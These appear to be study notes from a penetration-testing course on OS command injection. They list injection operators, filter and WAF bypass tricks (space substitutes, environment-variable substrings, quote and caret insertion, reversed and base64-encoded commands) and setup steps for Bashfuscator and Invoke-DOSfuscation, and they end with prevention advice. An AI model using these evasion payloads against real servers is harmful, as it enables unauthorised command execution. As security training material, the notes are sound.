# Command Injections

## Intro to Command Injections

Lets us execute arbitrary system commands on the back-end server through unsanitized user input used in a command-execution function, which can compromise the whole network.

### What are Injections

User input misinterpreted as part of a query, letting us change its intended outcome.

`OS Command Injection` user input used directly in an OS command | `Code Injection` user input used directly inside a function that evaluates code | `SQL Injection` user input used directly in an SQL query | `XSS/HTML Injection` exact user input displayed on a page

### OS Command Injections

User input directly or indirectly reaches a function that executes OS commands on the back-end.

#### PHP Example

`exec` `system` `shell_exec` `passthru` `popen` execute OS commands

#### NodeJS Example

`child_process.exec` `child_process.spawn` execute OS commands

## Detection

Append a command through an injection operator and compare the output to the expected result. A changed result means it worked.

### Command Injection Detection

Guess the back-end command from the input field and output pattern.

```bash
ping -c 1 <TARGET_IP>
```

### Command Injection Methods

`;` (%3b) semicolon, both executed, fails in Windows CMD, works in PowerShell | `\n` (%0a) newline, both executed | `&` (%26) background, both executed, second output usually shown first | `|` (%7c) pipe, only second output shown | `&&` (%26%26) AND, both only if first succeeds | `||` (%7c%7c) OR, second only if first fails | (%60%60) sub-shell, both, Linux only | `$()` (%24%28%29) sub-shell, both, Linux only

Works regardless of back-end language, framework, or OS.

## Injecting Commands

Front-end input validation (e.g. IP-format only) doesn't mean the back-end validates or sanitizes the same input.

### Injecting Our Command

Test the payload locally in bash first, then send it through a custom HTTP request straight to the back-end.

### Bypassing Front-End Validation

Intercept the request in a proxy and send it to the back-end directly, bypassing front-end checks.

`Ctrl+Shift+E` Firefox dev tools Network tab | `Ctrl+R` send intercepted request to Repeater | `Ctrl+U` URL-encode selected payload

## Other Injection Operators

More operators to chain an injected command onto the original one, each with different execution conditions.

### OR Operator

`||` runs the second command only if the first fails (non-zero exit code). Break the first command (e.g. omit the IP) to force the second to run.

### Operators by Injection Type

Operators that can subvert many other injection types too.

`; &&` Command Injection | `' ; -- /* */` SQL Injection | `* ( ) & |` LDAP Injection | `' or and not substring concat count` XPath Injection | `; & |` OS Command Injection | `' ; -- /* */ $() ${} #{} %{} ^` Code Injection | `../ ..\ %00` Directory/File Path Traversal | `; & |` Object Injection | `' ; -- /* */` XQuery Injection | `\x \u %u %n` Shellcode Injection | `\n \r\n \t %0d %0a %09` Header Injection

## Identifying Filters

Blacklisted characters/words on the back-end, or a WAF in front of it, can detect and block injection attempts.

### Filter/WAF Detection

Error shown inline in the app's own output means the app itself blocked it. Error on a different page showing your IP/request info suggests a WAF.

### Blacklisted Characters

App checks each character of the input against a blacklist array and denies the request on any match.

### Identifying Blacklisted Character

Reduce the payload to one character at a time and resend, to isolate exactly which character gets blocked.

## Bypassing Space Filters

Ways to avoid a blacklisted space character without breaking the payload.

### Bypass Blacklisted Operators

Newline is usually not blacklisted since legitimate input may need it.

### Bypass Blacklisted Spaces

Space is commonly blacklisted, especially on strict-format fields like an IP.

#### Using Tabs

Tab (%09) works the same as a space between arguments on Linux and Windows.

#### Using $IFS

`${IFS}` Linux env var defaults to space+tab, works between command arguments.

#### Using Brace Expansion

Bash brace expansion auto-inserts spaces between arguments.

```bash
{ls,-la}
```

## Bypassing Other Blacklisted Characters

Slash/backslash is commonly blacklisted since it's needed to specify directories.

### Linux

Take a 1-character substring of an env variable to produce a character without typing it.

```bash
echo ${PATH:0:1} # /
echo ${LS_COLORS:10:1} # ;
```

Check all env vars (`printenv`) for other useful characters.

### Windows

Same idea, using Windows env vars.

```cmd
echo %HOMEPATH:~6,-11%
```

Offsets depend on the length of the username on the box.

```powershell
$env:HOMEPATH[0]
Get-ChildItem Env:
```

### Character Shifting

Shift a character by 1 using `tr`, avoiding the literal blacklisted character.

```bash
man ascii # find the char just before the one needed
echo $(tr '!-}' '"-~'<<<[) # shifts input char by 1
```

## Bypassing Blacklisted Commands

A command blacklist checks for exact-match words. Obfuscating the command bypasses it.

### Commands Blacklist

Filter checks if any blacklisted word is a substring of the input (e.g. PHP `strpos`). A slightly different command bypasses it.

### Linux & Windows

Insert `'` or `"` between characters of the command. Quote types can't mix, and the count must be even.

```bash
w'h'o'am'i
w"h"o"am"i
```

### Linux Only

`\` and `$@` can be inserted anywhere in a command, any number of times.

```bash
who$@ami
w\ho\am\i
```

### Windows Only

`^` can be inserted anywhere in a CMD command.

```cmd
who^ami
```

## Advanced Command Obfuscation

Basic char/word bypasses may not beat advanced filters or WAFs. Use deeper obfuscation techniques instead.

### Case Manipulation

Windows PowerShell/CMD are case-insensitive, any case works. Linux bash is case-sensitive, lower-case the command dynamically.

```bash
$(tr "[A-Z]" "[a-z]"<<<"<CMD>")
$(a="<CMD>";printf %s "${a,,}")
```

Avoid spaces in these (use a space bypass, e.g. %09).

### Reversed Commands

Reverse the command string, then reverse it back and execute in a sub-shell. The actual command word never appears.

```bash
echo '<CMD>' | rev # get reversed string locally
$(rev<<<'<REVERSED>') # execute, reversing back
```

```powershell
"<CMD>"[-1..-20] -join '' # reverse locally
iex "$('<REVERSED>'[-1..-20] -join '')" # execute, reversing back
```

### Encoded Commands

Base64-encode the payload, then decode and execute it in a sub-shell. Avoids filtered or URL-decode-mangled characters.

```bash
echo -n '<CMD>' | base64 # encode locally
bash<<<$(base64 -d<<<<B64>) # decode and run, avoids pipe
```

Use `sh` instead of `bash`, or `openssl`/`xxd` instead of `base64`, if those are filtered.

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<CMD>')) # encode locally
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<B64>')))" # decode and run
```

```bash
echo -n <CMD> | iconv -f utf-8 -t utf-16le | base64 # utf-16le encode for a Windows target
```

## Evasion Tools

Automated obfuscation for advanced filters/WAFs where manual bypasses fail.

### Linux (Bashfuscator)

Clone and install, then obfuscate a command with `-c`.

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

```bash
./bashfuscator -h # help / list options
./bashfuscator -c '<CMD>' # obfuscate, random technique, can be huge
./bashfuscator -c '<CMD>' -s 1 -t 1 --no-mangling --layers 1 # shorter output
bash -c '<OBFUSCATED_CMD>' # test locally
```

### Windows (DOSfuscation)

Interactive tool. Clone and import, then use the menu.

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

`help` menu | `BINARY` obfuscated binary syntax for cmd.exe/powershell.exe | `ENCODING` env var encoding | `PAYLOAD` obfuscated payload

```powershell
SET COMMAND <CMD>
encoding
1
```

Run via `pwsh` on Linux/Pwnbox if no Windows VM is available.

## Command Injection Prevention

Avoid system-command functions, validate and sanitize input, and harden server config.

### System Commands

Use a built-in function instead of a system-exec function when one exists (e.g. PHP `fsockopen` instead of shelling out to check if a host is alive). Never pass user input, direct or indirect, to an exec function without validating and sanitizing it first.

### Input Validation

Validate format on both front-end and back-end.

```php
filter_var($_GET['ip'], FILTER_VALIDATE_IP)
```

```javascript
/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)
```

`is-ip` NodeJS validation library

### Input Sanitization

Remove unnecessary special characters after validation, since validation alone can fail (e.g. a bad regex).

```php
preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip'])
```

```javascript
ip.replace(/[^A-Za-z0-9.]/g, '')
```

```javascript
DOMPurify.sanitize(ip)
```

Blacklisting words/characters is weak. If all special characters must be allowed (e.g. comments), escape with PHP `escapeshellcmd` or NodeJS `escape(ip)` instead, though escaping is often bypassable.

### Server Configuration

WAF (web server module e.g. mod_security, or external e.g. Cloudflare) | Principle of Least Privilege, run web server as low-privileged user e.g. `www-data` | `disable_functions=system,...` turns off PHP exec functions | `open_basedir` restricts scope to app folder | reject double-encoded requests and non-ASCII in URLs | avoid outdated/sensitive libraries, e.g. PHP CGI